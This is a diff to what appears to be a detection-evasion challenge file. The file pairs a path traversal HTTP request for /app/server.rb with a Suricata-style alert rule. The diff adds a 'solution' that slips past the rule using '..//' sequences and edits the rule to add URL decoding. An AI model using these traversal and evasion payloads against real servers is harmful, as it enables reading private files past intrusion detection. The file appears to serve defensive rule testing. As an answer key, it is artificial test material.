@@ -17,9 +17,15 @@ base_request: |-
   GET /../../../../../../../app/server.rb HTTP/1.1
   Host: localhost
 
+solution: |-
+  GET /..//..//..//..//..//..//..//app/server.rb HTTP/1.1
+  Host: localhost
+
+solution_note: Doesn't handle ..//..//
+
 rules:
 # Raw, doesn't handle `.//.`
 - >
-  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri.raw; content: "./."; sid:123456; rev:1;)
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri.raw; url_decode; content: "./."; sid:123456; rev:1;)
 
 expected_output: "TCPServer.new"
